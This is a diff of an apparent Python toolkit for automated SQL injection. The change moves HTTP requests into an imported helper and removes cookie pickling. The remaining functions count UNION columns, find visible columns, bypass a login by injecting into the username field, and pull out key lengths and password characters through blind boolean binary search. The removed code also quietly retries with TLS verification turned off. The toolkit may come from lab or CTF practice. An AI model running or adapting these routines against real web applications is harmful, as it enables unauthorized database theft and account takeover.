@@ -1,58 +1,12 @@
-import requests
-from requests.exceptions import HTTPError
-import pickle
 from bs4 import BeautifulSoup
 import re
 import difflib
 from itertools import compress
-import urllib3
-
-
-def get_request(url: str, param: dict, cook={}, method='get',
-                print_resp=False, print_param=True) -> str:
-    if print_param:
-        print(param)
-    try:
-        response = (requests.get(url, params=param, cookies=cook)
-                    if method == 'get' else
-                    requests.post(url, data=param, cookies=cook))
-        if print_resp:
-            if method == 'get':
-                print(response.url)
-            print(response.text)
-        response.raise_for_status()
-    except HTTPError as http_err:
-        print(f'HTTP error occurred: {http_err}')
-    except Exception as err:
-        if 'SSLCertVerificationError' in str(err):
-            response = get_request_not_verify(url, param, cook, method)
-            return response.text
-        else:
-            print(f'Other error occurred: {err}')
-            exit(1)
-    else:
-        return response.text
-
-
-def get_request_not_verify(url: str, param: dict, cook: dict, method: str) -> str:
-    urllib3.disable_warnings()
-    try:
-        response = (requests.get(url, params=param, cookies=cook, verify=False)
-                    if method == 'get' else
-                    requests.post(url, data=param, cookies=cook, verify=False))
-        response.raise_for_status()
-    except HTTPError as http_err:
-        print(f'HTTP error occurred: {http_err}')
-        exit(1)
-    except Exception as err:
-        print(f'Other error occurred: {err}')
-        exit(1)
-    else:
-        return response
+from connect import my_request as req
 
 
 def find_error(url: str, param: str, cook: dict) -> str:
-    html_responce = get_request(url, param, cook).replace(
+    html_responce = req.my_request(url, param, cook).replace(
         '<b>', '').replace('</b>', '').replace('\n', '')
     soup = BeautifulSoup(html_responce, 'html.parser')
     war = soup.find_all(string=re.compile("Warning"))
@@ -82,7 +36,7 @@ def count_columns(url: str, payload: str, p: str, cook={}, encode=none_func) -> 
         if encode != none_func:
             print(pl)
         param = {p: encode(pl)}
-        html_responce_2 = get_request(url, param, cook)
+        html_responce_2 = req.my_request(url, param, cook)
         for s in difflib.ndiff(html_responce_2, html_responce_1):
             if i > 1 and ('+' in s[0] or '-' in s[0]):
                 return i - 1
@@ -106,10 +60,10 @@ def find_visible_columns(url: str, num_columns: int,
     '''
 
     list_of_visible = set()
-    html_visible = get_request(url, payload, cook, method)
+    html_visible = req.my_request(url, payload, cook, method)
 
     # Find differens
-    html_base = get_request(url, p_base, cook, method)
+    html_base = req.my_request(url, p_base, cook, method)
 
     for s in difflib.ndiff(html_visible, html_base):
         if s[0] == ' ':
@@ -141,7 +95,7 @@ def find_param(url: str,
     key: list of desired data
     '''
 
-    html_response = get_request(url, payload, cook, method)
+    html_response = req.my_request(url, payload, cook, method)
 
     # Find differens
     key = [''] * len_key
@@ -189,7 +143,7 @@ def find_column_position(url: str, list_of_columns: list, payload: str,
         tmp = list_of_columns[i]
         list_of_columns[i] = finds
         param = {p: payload % (','.join(list_of_columns))}
-        response = get_request(url, param, cook)
+        response = req.my_request(url, param, cook)
         soup = BeautifulSoup(response, 'html.parser')
         ret = soup.find(string=re.compile('rows'))
         # Find max of visible rows
@@ -220,7 +174,7 @@ def try_auth(url: str, list_of_columns: list, data: str,
         list_of_columns[i] = finds
         data_dict['username'] = data_dict['username'] % ','.join(
             list_of_columns)
-        response = get_request(url + p, data_dict, cook, 'post')
+        response = req.my_request(url + p, data_dict, cook, 'post')
         if 'Login successful' in response:
             return response
         list_of_columns[i] = tmp
@@ -235,7 +189,7 @@ def find_key_len(url: str, payload: str,
     while right > left + 1:
         middle = (left + right) // 2
         param = {p: payload % f'>{middle},1,0)'}
-        response = get_request(url, param, cook)
+        response = req.my_request(url, param, cook)
         if m_row in response:
             left = middle
         else:
@@ -252,7 +206,7 @@ def find_binary(url: str, payload: str,
         while b - a != 0:
             middle = a + (b - a) // 2 + 1
             param = {p: payload % (i, f'<{middle},1,0)')}
-            response = get_request(url, param, cook)
+            response = req.my_request(url, param, cook)
             if m_row in response:
                 b = middle - 1
             else:
@@ -268,11 +222,3 @@ def extract_pass(response: str, pass_r: str) -> str:
     passw = soup.find(string=re.compile(pass_r))
     return passw
 
-
-def save_cookies(cooks: dict):
-    try:
-        with open('cooks.pickle', 'wb') as f:
-            pickle.dump(cooks, f)
-    except:
-        print('can not write cookies')
-        exit(1)
